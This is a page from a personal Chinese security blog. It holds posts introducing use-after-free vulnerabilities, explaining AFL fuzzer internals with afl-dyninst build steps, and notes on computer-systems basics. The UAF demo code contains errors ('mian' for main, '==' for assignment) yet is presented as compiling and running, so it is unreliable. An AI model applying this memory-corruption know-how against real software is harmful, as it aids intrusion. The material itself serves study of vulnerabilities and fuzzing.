<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Page 2 | fanson&#39;s Blog</title>

  
  <meta name="author" content="fanson">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="fanson&#39;s Blog"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">fanson&#39;s Blog</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/07/Use-After-Free漏洞浅析/"><span>Use After Free漏洞浅析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/07/Use-After-Free漏洞浅析/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-07T04:20:53.000Z">
          2018-10-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h3 id="一：前言"><a href="#一：前言" class="headerlink" title="一：前言"></a>一：前言</h3><p>最近一直在研究浏览器相关的的漏洞，其中很多漏洞都是UAF，很多相关CTF的题也是关于该漏洞的，所以趁着国庆假期间，来捋一捋该方面的东西，谈谈自己对Use After Free漏洞的理解和漏洞原理的解析。</p>
<h3 id="二：UAF介绍"><a href="#二：UAF介绍" class="headerlink" title="二：UAF介绍"></a>二：UAF介绍</h3><p>UAF (Use After Free)漏洞是一种内存破坏漏洞,通常存在于浏览器中。该漏洞也称为”释放即<code>free()</code>后重引用”漏洞，触发漏洞在于”重引用”这一步，而重引用之前要通过”占坑”方式来修改要”重引用”的指针对应内存中的数据，然后”重引用”到已经变化了的构造好的数据，导致执行任意代码。</p>
<blockquote>
<p>即使浏览器的新版本加入了一系列控件与机制，使得利用这些漏洞变得更加困难。但是它们似乎仍然存在。</p>
</blockquote>
<h3 id="三：UAF漏洞原理"><a href="#三：UAF漏洞原理" class="headerlink" title="三：UAF漏洞原理"></a>三：UAF漏洞原理</h3><p>首先我们先从hello word 开始：）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mian</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p0;</span><br><span class="line">    p0=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);   <span class="comment">//指针p0申请内存；</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p0,<span class="string">"hello"</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p0 Addr:%x,%s\n"</span>,p0,p0);      <span class="comment">//打印其地址与值；</span></span><br><span class="line">    <span class="built_in">free</span>(p0);                             <span class="comment">//释放p0；</span></span><br><span class="line">    <span class="keyword">char</span> *p1;</span><br><span class="line">    p1==(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">"word"</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p1 Addr:%x,%s\n"</span>,p1,p0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接编译并运行如下图：</p>
<p><img src="/2018/10/07/Use-After-Free漏洞浅析/a.out.PNG" alt=""></p>
<p>通过该段代码我们可以知道<code>UAF</code>的利用过程：</p>
<ol>
<li>指针p0申请了一段空间，最后并将其释放，但在释放之后并不将指针置为空，故而该指针仍然可以使用p0指针；</li>
<li>申请空间p1，由于<code>malloc</code>分配的过程使得p1指向的空间为刚刚释放的p0指针的空间，构造恶意的数据将这段内存空间布局好，即覆盖了p0中的数据；</li>
<li>由代码可以看到p0与p1的地址是相同的，p0与p1指向的内存为同一地址，所以此时的数据即是我们可控制的；</li>
</ol>
<h3 id="四：利用场景"><a href="#四：利用场景" class="headerlink" title="四：利用场景"></a>四：利用场景</h3><p>后续。。。</p>
<h3 id="五：参考"><a href="#五：参考" class="headerlink" title="五：参考"></a>五：参考</h3><p>【1】<a href="https://www.cnblogs.com/alert123/p/4918041.html" target="_blank" rel="noopener">https://www.cnblogs.com/alert123/p/4918041.html</a></p>
<p>【2】<a href="https://www.anquanke.com/post/id/84359" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84359</a></p>
<p>【3】<a href="https://www.anquanke.com/post/id/85281" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85281</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/逆向/">逆向</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/10/07/AFL漫谈/"><span>AFL漫谈</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/10/07/AFL漫谈/" rel="bookmark">
        <time class="entry-date published" datetime="2018-10-07T03:55:22.000Z">
          2018-10-07
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>最近一直在研究fuzz 神器-AFL，但网上的相关资料相对甚少，所以就抽空简略的撸了下源码来了解相对细节的实现的过程以及其中的巧妙之处，所以想写些东西来记录下。</p>
<p><strong>一，AFL 简介</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL(American Fuzzy Lop)是一款开源的fuzzing工具，并且其中巧妙的采用了一个极其简单但是绝对可靠的，插桩代码导向的遗传算法来提升fuzz效率，而他的巧妙之点不止只体现在这一点上。最近我对其代码进行了简要的阅读，大致总结了一些AFL的实现细节以及其中的遗传算法的原理，在这来记录整理。</span><br></pre></td></tr></table></figure>
<p><strong>二，AFL的整个算法逻辑</strong></p>
<p>参考的官网的相关技术白皮书，抛出链接<a href="http://lcamtuf.coredump.cx/afl/technical_details.txt" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/technical_details.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Simplifying a bit, the overall algorithm can be summed up as:</span><br><span class="line">  1) Load user-supplied initial test cases into the queue,</span><br><span class="line">  2) Take next input file from the queue,</span><br><span class="line">  3) Attempt to trim the test case to the smallest size that doesn&apos;t alter</span><br><span class="line">     the measured behavior of the program,</span><br><span class="line">  4) Repeatedly mutate the file using a balanced and well-researched variety</span><br><span class="line">     of traditional fuzzing strategies,</span><br><span class="line">  5) If any of the generated mutations resulted in a new state transition</span><br><span class="line">     recorded by the instrumentation, add mutated output as a new entry in the</span><br><span class="line">     queue.</span><br><span class="line">  6) Go to 2.</span><br></pre></td></tr></table></figure>
<p>实现的具体流程图如下：</p>
<p><img src="/2018/10/07/AFL漫谈/liuc.PNG" alt=""></p>
<p><strong>三，AFL的整体框架</strong></p>
<p><strong><code>AFL的fuzz具体代码实现流程</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. main函数先进行初始化和选项处理；</span><br><span class="line">2. 执行input文件夹下的预先准备的所有testcase（perform_dry_run），生成初始化的queue和bitmap；</span><br><span class="line">3. 通过cull_queue对queue进行精选，减小input的量；</span><br><span class="line">4. 然后进行while(1)循环不断进行fuzz。</span><br><span class="line">每次在fuzz一个queue后，就会进入while(1),并重新调用cull_queue()对队列进行精选，而在while(1)具体实现以下过程：</span><br><span class="line">1. cull_queue()根据top_rated设置queue中的favored标志，对queue进行精选，选出favored；</span><br><span class="line">2. 判断queue_cur是否为NULL，如果是，则表示已经完成对队列的遍历，queue_cycle++,初始化相关参数，重新开始遍历队列；</span><br><span class="line">3. fuzz queue_cur对应的input文件；</span><br><span class="line">4. 判断是否结束，并更新queue_cur和current_entry；</span><br><span class="line">当队列中的所有文件都经过变异测试了，则完成一次”cycle done”; </span><br><span class="line">整个队列又会从第一个文件开始，再次继续进行变异，不过与第一次变异不同的是，因为没有随机性，这一次变异就不需要再进行deterministic fuzzing了。而至于什么是deterministic fuzzing，我们在下面的fuzz策略中会作介绍；</span><br></pre></td></tr></table></figure>
<p><strong><code>AFL的fuzz策略</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">   总的来讲，AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下：</span><br><span class="line">1.bitflip，按位翻转，1变为0，0变为1</span><br><span class="line">2.arithmetic，整数加/减算术运算</span><br><span class="line">3.interest，把一些特殊内容替换到原文件中</span><br><span class="line">4.dictionary，把自动生成或用户提供的token替换/插入到原文件中</span><br><span class="line">5.havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，</span><br><span class="line">6.splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</span><br><span class="line">其中，前四项bitflip, arithmetic, interest, dictionary由于其变异方式没有随机性，所以也称为deterministic fuzzing；而havoc和splice则存在随机性，是所有状况的fuzzer（是否dumb mode、主从fuzzer）都会执行的变异。</span><br><span class="line"></span><br><span class="line">bitflip变异：</span><br><span class="line">拿到一个原始文件，首先的变异类型就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为：</span><br><span class="line">bitflip 1/1，每次翻转1个bit，按照每1个bit的步长从头开始</span><br><span class="line">bitflip 2/1，每次翻转相邻的2个bit，按照每1个bit的步长从头开始</span><br><span class="line">bitflip 4/1，每次翻转相邻的4个bit，按照每1个bit的步长从头开始</span><br><span class="line">bitflip 8/8，每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转</span><br><span class="line">effector map的生成：完成bitflip 8/8的同时，还生成了effector map，该作用是对byte进行标记，在对每个byte进行翻转变异时，其新的执行路径与原来的路径不一致时，就对该byte标记为1，表示即为有效的，否则标记为0；这样做的优点是如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。</span><br><span class="line">bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转</span><br><span class="line">bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转</span><br><span class="line"></span><br><span class="line">arithmetic变异：</span><br><span class="line">arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异</span><br><span class="line">arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异</span><br><span class="line">arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异</span><br><span class="line">加减运算的相关设置在config.h定义，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。此外，AFL会智能的跳过某些arithmetic,第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。</span><br><span class="line"></span><br><span class="line">interest变异：</span><br><span class="line">interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换</span><br><span class="line">interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换</span><br><span class="line">interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换</span><br><span class="line">其中interest value的值在config.h已经设定好</span><br><span class="line">#define INTERESTING_8 \</span><br><span class="line">  -128,          /* Overflow signed 8-bit when decremented  */ \</span><br><span class="line">  -1,            /*                                         */ \</span><br><span class="line">   0,            /*                                         */ \</span><br><span class="line">   1,            /*                                         */ \</span><br><span class="line">   16,           /* One-off with common buffer size         */ \</span><br><span class="line">   32,           /* One-off with common buffer size         */ \</span><br><span class="line">   64,           /* One-off with common buffer size         */ \</span><br><span class="line">   100,          /* One-off with common buffer size         */ \</span><br><span class="line">   127           /* Overflow signed 8-bit when incremented  */</span><br><span class="line">可以看到，用于替换的基本都是可能会造成溢出的数;与之前相同，effector map仍然会用于判断是否需要变异；</span><br><span class="line"></span><br><span class="line">dictionary变异：</span><br><span class="line">user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中</span><br><span class="line">user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中</span><br><span class="line">auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中</span><br><span class="line">tokens:在进行bitflip 1/1变异时，对于每个byte的最低位(least significant bit)翻转还进行了额外的处理：如果连续多个bytes的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的bytes判断是一条token。</span><br><span class="line"></span><br><span class="line">havoc变异：</span><br><span class="line">随机选取某个bit进行翻转</span><br><span class="line">随机选取某个byte，将其设置为随机的interesting value</span><br><span class="line">随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</span><br><span class="line">随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</span><br><span class="line">随机选取某个byte，对其减去一个随机数</span><br><span class="line">随机选取某个byte，对其加上一个随机数</span><br><span class="line">随机选取某个word，并随机选取大、小端序，对其减去一个随机数</span><br><span class="line">随机选取某个word，并随机选取大、小端序，对其加上一个随机数</span><br><span class="line">随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</span><br><span class="line">随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</span><br><span class="line">随机选取某个byte，将其设置为随机数</span><br><span class="line">随机删除一段bytes</span><br><span class="line">随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</span><br><span class="line">随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</span><br><span class="line">随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</span><br><span class="line">随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</span><br></pre></td></tr></table></figure>
<p><strong><code>Fuzzer dictionaries</code></strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">刚开始我们或许都有个疑惑，afl的最显眼的局限之一是如何解决的，afl的变异引擎是语法盲，并针对紧凑数据格式（即，图像，多媒体，压缩数据，正则表达式语法或shell脚本）进行了优化，但是它不太适合特别冗长，冗余并且带有语法的的语言 - 尤其包括HTML，SQL或JavaScript。</span><br><span class="line">为了避免构建语法感知工具的麻烦，afl-fuzz提供了一种使用语言关键字，magic header或其他与目标数据类型相关联的特殊表示的可选字典为模糊过程提供种子的方法 - 并且使用它来重建底层语法</span><br></pre></td></tr></table></figure>
<p><strong><code>forkserver</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编译 target 完成后，就可以通过 afl-fuzz 开始 fuzzing了。其大致思路是，对输入的 seed 文件不断地变化，并将这些 mutated input 喂给 target 执行，检查是否会造成崩溃。因此，fuzzing 涉及到大量的 fork 和执行 target 的过程。 为了更高效地进行上述过程，AFL 实现了一套 fork server 机制。其基本思路是：启动 target 进程后，target 会运行一个 fork server；fuzzer 并不负责 fork 子进程，而是与这个 fork server 通信，并由 fork server 来完成fork 及继续执行目标的操作。这样设计的最大好处，就是不需要调用execve()，从而节省了载入目标文件和库、解析符号地址等重复性工作。 接下来，我们来看看 fork server 的具体运行原理。</span><br></pre></td></tr></table></figure>
<p><img src="/2018/10/07/AFL漫谈/forkserver.PNG" alt=""></p>
<p><strong><code>内存共享</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    作为fuzzer，AFL并不是毫无目的对输入文件无脑地随机变化（其实也支持这种方式，即dumb模式），它会对target进行插桩，以辅助mutated input的生成。具体地，插桩后的target，会记录执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。 </span><br><span class="line">AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。</span><br><span class="line"></span><br><span class="line">1.fuzzer在启动时，会执行setup_shm()方法进行配置。其首先调用shemget()分配一块共享内存，大小MAP_SIZE为64K:</span><br><span class="line">shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600);</span><br><span class="line">2.分配成功后，该共享内存的标志符会被设置到环境变量中，从而之后fork()得到的子进程可以通过该环境变量，得到这块共享内存的标志符：</span><br><span class="line">shm_str = alloc_printf(&quot;%d&quot;, shm_id);</span><br><span class="line">if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1);</span><br><span class="line">并且，fuzzer本身，会使用变量trace_bits来保存共享内存的地址：</span><br><span class="line">trace_bits = shmat(shm_id, NULL, 0);</span><br><span class="line">3.在每次target执行之前，fuzzer首先将该共享内容清零：</span><br><span class="line">memset(trace_bits, 0, MAP_SIZE); </span><br><span class="line">4.target获取并使用这块共享内存的。相关代码同样也在上面提到的方法__afl_maybe_log()中。首先，会检查是否已经将共享内存映射完成：__afl_area_ptr中保存的就是共享内存映射到target的内存空间中的地址，如果其不是NULL，便保存在ebx中继续执行；否则进一步跳转到__afl_setup。__afl_setup处会做一些错误检查，然后获取环境变量AFL_SHM_ENV的内容并将其转为整型。查看其定义便可知，这里获取到的，便是之前fuzzer保存的共享内存的标志符。</span><br><span class="line">5.最后，通过调用shmat()，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在__afl_area_ptr及edx中。由此，便完成了fuzzer与target之间共享内存的设置。</span><br><span class="line"></span><br><span class="line">注记：如果使用了fork server模式，那么上述获取共享内存的操作，是在fork server中进行；随后fork出来的子进程，只需直接使用这个共享内存即可。</span><br></pre></td></tr></table></figure>
<p><strong>四，使用afl-dyninst fuzz无源码的二进制程序</strong></p>
<p>通常来讲，afl-fuzz需要对待fuzz程序重编译，重而对其进行插桩,这就要求拥有待fuzz程序的完整源代码。而afl-dyninst提供了一种静态无源码插桩的手段使得可以对无源码二进制程序插桩。</p>
<p>下载编译首先需要安装以下软件:sudo apt-get </p>
<p><strong><code>下载&amp;&amp;编译</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libelf-dev libelf1 libiberty-dev libboost-all-dev</span><br></pre></td></tr></table></figure>
<p><code>afl-dyninst是基于dyninst的,所以需要下载&amp;&amp;编译&amp;&amp;安装dyninst:</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dyninst/dyninst.git</span><br><span class="line">cd dyninst</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DBOOST_LIBRARYDIR=/usr/lib/x86_64-linux-gnu</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p><code>下载&amp;&amp;编译afl-dyninst</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/talos-vulndev/afl-dyninst.git</span><br><span class="line">cd afl-dyninst</span><br><span class="line">make</span><br><span class="line">sudo cp afl-dyninst /usr/bin/</span><br><span class="line">sudo cp libAflDyninst.so /usr/local/lib/</span><br><span class="line">echo &quot;/usr/local/lib&quot; &gt; /etc/ld.so.conf.d/dyninst.conf &amp;&amp; ldconfig</span><br><span class="line">echo &quot;export DYNINSTAPI_RT_LIB=/usr/local/lib/libdyninstAPI_RT.so&quot; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
<p><strong><code>使用</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Usage: ./afl-dyninst -i &lt;binary&gt; -o &lt;binary&gt; -l &lt;library&gt; -e &lt;address&gt; -s &lt;number&gt;</span><br><span class="line">             -i: Input binary </span><br><span class="line">             -o: Output binary</span><br><span class="line">             -l: Library to instrument (repeat for more than one)</span><br><span class="line">             -e: Entry point address to patch (required for stripped binaries)</span><br><span class="line">             -r: Runtime library to instrument (path to, repeat for more than one)</span><br><span class="line">             -s: Number of basic blocks to skip</span><br><span class="line">             -v: Verbose output</span><br><span class="line">example:</span><br><span class="line">afl-dyninst -i testbin -o testbin_ins</span><br><span class="line">to fuzz:</span><br><span class="line">export AFL_SKIP_BIN_CHECK=1</span><br><span class="line">afl-fuzz -i in -o out testbin_ins</span><br></pre></td></tr></table></figure>
<p><strong>五，AFL的优化改进方向</strong></p>
<p>​        这几天通过对源码的阅读学习，领略了该神级工具的设计巧妙与功能强大之处，当然在实现的过程中，也存在些许不足，会想尝试能不能自己去做一个优化或者改进，让他能具有一定的针对性或者更强的fuzz能力，参考了各位大牛的paper，结合afl的不足，总结下优化改进的一些点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.coverage的碰撞问题</span><br><span class="line">   AFL要用到一个64KB bitmap来保存Coverage的信息，在这个过程，它是通过给边算出来hash值，用hash代表边来更新bitmap,而在hash算法中则存在碰撞问题，它而影响这个Fuzzer的判断，这个Fuzzer会根据bitmap来判断当前这个种子是不是好的优秀的种子，判断这个种子是不是走了新的边，如果碰撞了，它是看不出来这是新的边。如果新的边出现了，它的哈希值与前哈希值是一样的，那么Fuzzer认为这个边是测过的边，认为这个种子没用，进而扔掉了实际很好的种子。甚至会漏掉一些crash.</span><br><span class="line">2.变异阶段的随机性问题</span><br><span class="line">    变异的类型可分为bitflip，arithmetic，interest，dictionary，havoc，splice六种，而在这六种类型中后面俩种havoc和splice都是没有针对性的，存在一定的随机性，而这些部分也就成了不折不扣的“看天吃饭”，所以，可以在变异策略上优化减少这种随机性，尽量去变异那些更重要的字符。</span><br><span class="line">3.改进种子的选择策略</span><br><span class="line">    可以改进优先选择对Coverage有贡献的种子</span><br></pre></td></tr></table></figure>
<p><strong>六，参考文献</strong></p>
<p>【1】<a href="https://rk700.github.io/2018/01/04/afl-mutations/" target="_blank" rel="noopener">https://rk700.github.io/2018/01/04/afl-mutations/</a></p>
<p>【2】<a href="http://chao.100871.net/papers/oakland18.pdf" target="_blank" rel="noopener">http://chao.100871.net/papers/oakland18.pdf</a></p>
<p>【3】<a href="https://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html" target="_blank" rel="noopener">https://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html</a></p>
<p>【4】<a href="https://blog.csdn.net/Chen_zju/article/details/80791268" target="_blank" rel="noopener">https://blog.csdn.net/Chen_zju/article/details/80791268</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/fuzz-tools/">fuzz tools</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/09/28/读书笔记/"><span>读书笔记</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/28/读书笔记/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-28T15:17:36.000Z">
          2018-09-28
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>读《程序员的自我修养》记录</p>
<p>三个关键部位 ：中央处理器CPU  内存和I/O控制芯片</p>
<p>为了能够让CPU能够和I/O设备进行通信，每个设备都会有一个I/O控制器</p>
<p>南桥/北桥：由于北桥运行的速度非常高，所有相对低速的设备如果全都直接连接在北桥上，北桥既须处理高速设备，又须处理低速设备，设计就会十分复杂，于是人们又设计了专门处理低速设备的南桥芯片，磁盘，USB，键盘，鼠标等设备都连接在南桥上，由南桥将他们汇总后链接在北桥上。</p>
<p>对称多处理器（SMP）:(多个CPU)，每个CPU在系统中所处的地位和发挥的功能都是一样的，是相互对称的。理论上讲，增加CPU的数量就可以提高运算速度，并且理想情况下，速度的提高与CPU的数量成正比。但实际并非如此，因为我们的程序并不都能分解成若干的完全不相干的子问题，就比如一个女生可以花10个月生出一个孩子，但是十个女生并不能在一个月就生出一个孩子一样。</p>
<p>多核处理器：多个处理器共享一个缓存部件，其实为简化版SMP</p>
<p>‘’计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决。’’</p>
<p>计算机软件体系结构（图）</p>
<p>接口：满足每个层次之间的相互通信的通信的协议</p>
<p>虚拟机技术：在硬件与操作系统之间增加了一层虚拟层，使得一个计算机上可以同时运行多个操作系统。</p>
<p>系统调用接口在实现中往往以软件中断的方式提供，eg:Linux使用0x80号中断作为系统调用接口；windows使用0x2E号中断作为系统调用接口（Windows XP Sp2开始，windows开始采用一种新的系统调用方式）。</p>
<p>分时系统：每个程序运行一段时间以后都主动让出CPU给其他程序，使得一段时间内每个程序都有机会运行一小段时间。</p>
<p>多任务系统：操作系统接管了所有的硬件资源，并且本身运行在一个受硬件保护的级别。所有的应用程序都以进程的方式运行在比操作系统权限更低的级别，每个进程都有自己独立的地址空间，是得进程之间的地址空间相互隔离。</p>
<p>抢占式：操作系统可以强制剥夺CPU资源并且分配给它认为目前最需要的进程。</p>
<p>磁盘寻址：</p>
<p>如何找到我们想要的数据呢？即如何在硬盘上找到任意一个物理地址。</p>
